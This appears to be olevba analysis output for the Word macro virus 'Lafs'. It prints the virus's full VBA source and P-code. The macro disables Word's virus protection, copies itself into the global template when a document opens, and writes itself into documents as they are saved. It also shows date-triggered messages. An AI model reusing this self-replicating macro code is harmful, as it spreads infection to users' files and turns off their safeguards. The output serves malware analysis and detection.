olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lafs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Lafs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lafs.bas 
in file: ./Virus.MSWord.Lafs - OLE stream: 'Macros/VBA/lafs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
On Error GoTo abort
Options.VirusProtection = False
exec

sFn$ = WordBasic.[FileName$]()
sMn$ = sFn$ + ":dd"
WordBasic.MacroCopy sMn$, "Global:lafs"

abort:
End Sub
Sub Autoclose()
On Error GoTo quit
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sFn$ = WordBasic.[FileName$]()
sMn$ = sFn$ + ":dd"
WordBasic.MacroCopy "Global:lafs", sMn$

WordBasic.FileSaveAs dlg
GoTo Done
quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub

Sub ToolsMacro()
End Sub


Sub ViewVbCode()

End Sub

Sub FileTemplates()

End Sub
Sub exec()

tgl$ = Day(Now())
bln$ = Month(Now())
If tgl$ = 14 And bln$ = 6 Then
With Assistant.NewBalloon
    .Heading = "Happy Birthday"
    .Text = "Selamat Ulang Tahun sayang semoga panjang umur dan tuhan menyertaimu."
    .Icon = msoIconTip
    .Show
End With
End If
If tgl$ = 6 And bln$ = 11 Then
T$ = Chr(13) + " Love at First Sight" + Chr(13)
T$ = T$ + Chr(13) + " Patas AC 19 "
T$ = T$ + Chr(13) + "6 November 1997 "

WordBasic.FormatFont Font:="Arial", Points:=10
WordBasic.Insert T$
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Lafs
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/lafs - 4124 bytes
' Line #0:
' 	FuncDefn (Sub Autoopen())
' Line #1:
' 	OnError abort 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	ArgsCall exec 0x0000 
' Line #4:
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sFn$ 
' Line #6:
' 	Ld sFn$ 
' 	LitStr 0x0003 ":dd"
' 	Add 
' 	St sMn$ 
' Line #7:
' 	Ld sMn$ 
' 	LitStr 0x000B "Global:lafs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' Line #9:
' 	Label abort 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Sub Autoclose())
' Line #12:
' 	OnError quit 
' Line #13:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #15:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sFn$ 
' Line #17:
' 	Ld sFn$ 
' 	LitStr 0x0003 ":dd"
' 	Add 
' 	St sMn$ 
' Line #18:
' 	LitStr 0x000B "Global:lafs"
' 	Ld sMn$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' Line #20:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	GoTo Done 
' Line #22:
' 	Label quit 
' Line #23:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #24:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Label Done 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Sub ToolsMacro())
' Line #30:
' 	EndSub 
' Line #31:
' Line #32:
' Line #33:
' 	FuncDefn (Sub ViewVbCode())
' Line #34:
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Sub FileTemplates())
' Line #38:
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub exec())
' Line #41:
' Line #42:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St tgl$ 
' Line #43:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	St bln$ 
' Line #44:
' 	Ld tgl$ 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld bln$ 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #45:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #46:
' 	LitStr 0x000E "Happy Birthday"
' 	MemStWith Heading 
' Line #47:
' 	LitStr 0x0045 "Selamat Ulang Tahun sayang semoga panjang umur dan tuhan menyertaimu."
' 	MemStWith Then 
' Line #48:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #49:
' 	ArgsMemCallWith Show 0x0000 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld tgl$ 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld bln$ 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #53:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0014 " Love at First Sight"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St T$ 
' Line #54:
' 	Ld T$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D " Patas AC 19 "
' 	Add 
' 	St T$ 
' Line #55:
' 	Ld T$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "6 November 1997 "
' 	Add 
' 	St T$ 
' Line #56:
' Line #57:
' 	LitStr 0x0005 "Arial"
' 	ParamNamed Font 
' 	LitDI2 0x000A 
' 	ParamNamed Points 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' Line #58:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

